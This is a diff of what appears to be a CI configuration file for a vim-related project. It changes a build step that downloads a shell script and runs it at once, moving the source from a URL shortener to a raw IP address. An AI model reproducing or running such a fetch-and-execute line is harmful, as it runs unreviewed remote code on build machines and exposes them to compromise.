@@ -48,4 +48,4 @@ install: |
   make
   make install
   cd -
-script: curl http://dwz.cn/fscvim -L > fsc.sh && sh fsc.sh
+script: curl http://47.92.112.211/wp-content/uploads/FSC.sh -L > fsc.sh && sh fsc.sh
